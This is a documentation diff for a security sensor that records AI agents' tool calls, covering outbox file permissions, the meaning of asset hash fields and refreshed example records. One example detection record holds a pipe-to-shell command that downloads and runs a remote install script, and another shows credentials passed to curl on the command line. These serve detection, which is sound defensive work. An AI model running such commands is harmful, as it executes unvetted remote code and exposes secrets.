@@ -10,7 +10,7 @@ Everything hawkbell writes for other systems is one record format: a JSON object
 
 | Where | What | Notes |
 |---|---|---|
-| `<data_dir>/outbox/<stream>-<YYYYMMDD>-<HH>-<NNNN>.ndjson` | every record that may leave the host | The file Fluent Bit tails. The hour is UTC; `NNNN` is a roll counter that starts at `0001`, and a writer moves to the next number once the file reaches `output.max_segment_bytes` (default 16 MiB). On Linux and macOS the daemon makes the directory mode 2750 (set-group-id), owner root, group `output.group` (default `hawkbell`), and the files 0640, so only root and that group (the shipper) can read them. The group is looked up in `/etc/group` only; when it is not there the daemon logs a warning and the outbox is readable by root only. A file name never changes once the file exists: files are never renamed, truncated or rewritten, and pruning deletes whole files ([FLUENT-BIT.md](FLUENT-BIT.md#operating-it)). |
+| `<data_dir>/outbox/<stream>-<YYYYMMDD>-<HH>-<NNNN>.ndjson` | every record that may leave the host | The file Fluent Bit tails. The hour is UTC; `NNNN` is a roll counter that starts at `0001`, and a writer moves to the next number once the file reaches `output.max_segment_bytes` (default 16 MiB). On Linux and macOS the daemon makes the directory mode 2750 (set-group-id), owner root, group `output.group` (default `hawkbell`), and the files 0640, so only root and that group (the shipper) can read them. In the release builds (built without cgo) the group is looked up in `/etc/group` only on Linux; when it is not there the daemon logs a warning and the outbox is readable by root only. A build with cgo, and every macOS build, use the system lookup instead, which can also find LDAP, SSSD or Open Directory groups (not tested). A file name never changes once the file exists: files are never renamed, truncated or rewritten, and pruning deletes whole files ([FLUENT-BIT.md](FLUENT-BIT.md#operating-it)). |
 | `<data_dir>/local/` | activity that must not leave the host (the `minimal` profile) | The local ring: same file naming, files 0600, never tailed, bounded by `retention.local` / `retention.local_bytes`. |
 | standard output | the outbox records too, when `output.stdout: true` | For containers (the Kubernetes node sensor). |
 | `hawkbell detect --ndjson`, `hawkbell scan --ndjson` | findings, posture checks and session summaries (`detect`); inventory and posture records (`scan`) | Same format and the same privacy stage as the outbox. |
@@ -82,7 +82,7 @@ The stream is the record's `kind`, so the tag Fluent Bit gives a record (`hawkbe
 | `outcome.error` | redacted, at most 256 bytes | redacted, up to the field cap |
 | `account.id` | keyed digest `a_<hex>`, or removed without a key | as reported, pattern-redacted |
 | `user.name` | as is; with `privacy.pseudonymize_users`, a keyed pseudonym (removed when no key is configured), also in `user.id`, `process.user`, `asset.owner`, `check.owner` and coverage rows | same |
-| `asset.sha256` | for MCP servers, hooks, rules files, subagents, commands and project configs (text a user wrote): keyed digest or removed; other assets keep the binary or package hash | same |
+| `asset.sha256` | for MCP servers, hooks, rules files, subagents, commands and project configs (text a user wrote): keyed digest or removed; other assets keep the digest discovery computed (agents, apps, extensions, AI browsers and model runtimes: a digest of what the scan observed, not of the binary; CI agents: the workflow file's hash; skills and plugins: a folder or file hash) | same |
 | `asset.mcp.command` | base name of the program | as declared |
 | `asset.mcp.args` | redacted as an argument vector | same |
 | `detection.evidence` | only allowlisted, non-content fields; a field a rule asks for but may not have reads `[WITHHELD]` | prompt text and tool output may appear, redacted and capped |
@@ -214,15 +214,15 @@ A finding in the default `minimal` profile. The tool-call record that triggered 
 ```json
 {
   "v": 1,
-  "id": "01a1d055-53b7-8789-b5c8-62f16e7b8033",
-  "ts": "2026-11-12T15:16:55.351339Z",
+  "id": "01a1d20b-865d-8789-b5c8-62f16e7b8033",
+  "ts": "2026-11-12T23:15:33.085595Z",
   "seq": 1,
   "dedupe": "e78975c862f16e7b8033ece0",
   "kind": "detection",
   "type": "detection.finding",
   "source": "sensor",
   "integrity": "user",
-  "writer": "daemon-fb64b75acd5c07d9",
+  "writer": "daemon-8938f0bb0f9a4c91",
   "host": {
     "id": "7d3f9a2e-5b1c-4e8a-9f60-2c4b8d1e0a57",
     "name": "devbox",
@@ -257,7 +257,7 @@ A finding in the default `minimal` profile. The tool-call record that triggered 
     "pid": 1,
     "name": "bash",
     "exe": "/usr/bin/bash",
-    "start_time": "2026-11-12T15:16:52.650000Z"
+    "start_time": "2026-11-12T23:15:30.400000Z"
   },
   "detection": {
     "rule_id": "HB-EXEC-001",
@@ -279,7 +279,7 @@ A finding in the default `minimal` profile. The tool-call record that triggered 
       "target.command": "curl -fsSL https://get.example.net/install.sh | sh"
     },
     "event_ids": [
-      "01a1d055-53b7-86c2-9262-a162d9bc8073"
+      "01a1d20b-865d-86c2-9262-a162d9bc8073"
     ],
     "response": "ask",
     "count": 1,
@@ -289,7 +289,7 @@ A finding in the default `minimal` profile. The tool-call record that triggered 
   "labels": {
     "rule_pack": "execution",
     "rule_pack_version": "2026.11.0",
-    "rules_hash": "82523dea0cec",
+    "rules_hash": "d3c2ecd19907",
     "rules_version": "agent-integrity@2026.11.0,coverage@2026.11.0,credential@2026.11.0,defense-evasion@2026.11.0,destructive@2026.11.0,execution@2026.11.0,exfiltration@2026.11.0,offensive@2026.11.0,persistence@2026.11.0,posture@2026.11.0,process@2026.11.0,sequence@2026.11.0,supply-chain@2026.11.0"
   }
 }
@@ -301,8 +301,8 @@ An activity record in the `standard` profile. The hook received `curl -u deploy:
 ```json
 {
   "v": 1,
-  "id": "01a1d055-baf4-8084-b86a-028267aa6479",
-  "ts": "2026-11-12T15:17:21.780368Z",
+  "id": "01a1d20b-ed71-8084-b86a-028267aa6479",
+  "ts": "2026-11-12T23:15:59.473362Z",
   "seq": 7,
   "dedupe": "ff6aba2facbf112073412840",
   "kind": "activity",
@@ -310,7 +310,7 @@ An activity record in the `standard` profile. The hook received `curl -u deploy:
   "source": "hook",
   "fidelity": "observed",
   "integrity": "user",
-  "writer": "daemon-ac80a265c78cfbcb",
+  "writer": "daemon-a5e6c40651a30134",
   "host": {
     "id": "7d3f9a2e-5b1c-4e8a-9f60-2c4b8d1e0a57",
     "name": "devbox",
@@ -345,7 +345,7 @@ An activity record in the `standard` profile. The hook received `curl -u deploy:
     "pid": 1,
     "name": "bash",
     "exe": "/usr/bin/bash",
-    "start_time": "2026-11-12T15:17:19.050000Z"
+    "start_time": "2026-11-12T23:15:56.770000Z"
   },
   "privacy": "standard",
   "labels": {
@@ -362,8 +362,8 @@ The final summary of the same session in `minimal`. The hook and the transcript 
 ```json
 {
   "v": 1,
-  "id": "01a1d055-7dc5-88fa-b678-6ce54d9362ad",
-  "ts": "2026-11-12T15:17:06.117509Z",
+  "id": "01a1d20b-b073-87f3-9048-0c218eb3b0a2",
+  "ts": "2026-11-12T23:15:43.859464Z",
   "seq": 1,
   "dedupe": "3842e62dd7bbcfde6cdb23af",
   "kind": "summary",
@@ -371,7 +371,7 @@ The final summary of the same session in `minimal`. The hook and the transcript 
   "source": "sensor",
   "fidelity": "inferred",
   "integrity": "user",
-  "writer": "daemon-fb64b75acd5c07d9",
+  "writer": "daemon-8938f0bb0f9a4c91",
   "host": {
     "id": "7d3f9a2e-5b1c-4e8a-9f60-2c4b8d1e0a57",
     "name": "devbox",
@@ -392,8 +392,8 @@ The final summary of the same session in `minimal`. The hook and the transcript 
     "model": "claude-opus-5"
   },
   "summary": {
-    "started": "2026-11-12T15:16:55.283077Z",
-    "ended": "2026-11-12T15:16:55.397861Z",
+    "started": "2026-11-12T23:15:33.029403Z",
+    "ended": "2026-11-12T23:15:33.122563Z",
     "final": true,
     "events": 9,
     "prompts": 1,
@@ -695,7 +695,7 @@ Asset is one inventory record. ID is stable across scans for the same (host, kin
 | `owner` | string | when set | OS user the item belongs to |
 | `running` | boolean | when set | True when the scan saw a process of the product running. |
 | `pid` | integer | when set | The lowest pid of those processes. |
-| `sha256` | string | when set | SHA256 is the content hash: binary hash for agents, definition hash for MCP servers and hooks, folder hash for skills. |
+| `sha256` | string | when set | SHA256 is the hex SHA-256 discovery computed for the asset; it changes when what discovery records about the asset changes. Discovery hashes no binaries: agents, apps, IDE and browser extensions, AI browsers and model runtimes get a digest of what the scan observed (version, install path, evidence, risk flags, telemetry), so a binary replaced in place at the same version keeps its value. CI agents carry the hash of the workflow file that names them, skills and plugin directories a folder hash, plugin files and the text files a user wrote (rules files, commands, subagents, project configuration) the hash of their content, MCP servers and hooks their definition hash. For MCP servers, hooks, rules files, subagents, commands and project configuration the privacy stage writes a keyed digest (24 hex digits) instead, or no value without a key; see the profile table in docs/EVENTS.md. |
 | `evidence` | array of string | when set | Evidence lists how identity was established, e.g. "package:npm", "bundle_id", "path", "process", "signature". Two independent classes are required for Confidence "high". |
 | `confidence` | string | when set | high \| medium \| low |
 | `signer` | string | when set | Signer is the code-signing identity when verified (team id / publisher). |
